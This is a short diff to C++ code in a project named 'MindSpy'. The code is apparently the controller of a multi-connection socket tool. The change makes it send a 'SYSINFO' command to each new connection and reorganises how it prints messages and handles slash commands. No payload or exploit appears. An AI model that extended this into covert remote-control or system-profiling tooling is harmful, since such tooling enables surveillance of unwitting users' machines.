@@ -51,6 +51,7 @@ namespace MindSpy
 			sConexiones = (PCONEXION)realloc(sConexiones, sizeof(CONEXION)*(++cantidadConexiones + 1));
 			CreateThread(NULL, NULL, &HiloConexionStatic, this, NULL, NULL);
 			while (!sConexiones[cantidadConexiones - 1].Activa) Sleep(30);
+			EnviarMensaje(sConexiones[cantidadConexiones - 1].IP, "SYSINFO");
 		}
 	}
 
@@ -79,14 +80,23 @@ namespace MindSpy
 		while (true) {
 			int resp = recv(sConexiones[MyID].c_socket, szBuff, sizeof(szBuff), 0);
 			if (resp > 0 && strlen(szBuff)) {
-				if (strlen(sConexiones[MyID].Alias)) {
-					cout << "Mensaje de" << sConexiones[MyID].Alias << " (" << sConexiones[MyID].IP << "): " << szBuff << endl;
-				}
-				else {
-					cout << "Mensaje de " << sConexiones[MyID].IP << ": " << szBuff << endl;
-				}
 
-				if (szBuff[0] == '/') {
+				if (szBuff[0] != '/') 
+				{
+					if (strlen(sConexiones[MyID].Alias)) {
+						cout << "Mensaje de" 
+							<< sConexiones[MyID].Alias 
+							<< " (" << sConexiones[MyID].IP 
+							<< "): " << szBuff << endl;
+					}
+					else 
+					{
+						cout << "Mensaje de " << sConexiones[MyID].IP 
+							<< ": " << szBuff << endl;
+					}
+				} 
+				else
+				{
 					if (!strcmp(szBuff, "/close")) {
 						break;
 					}
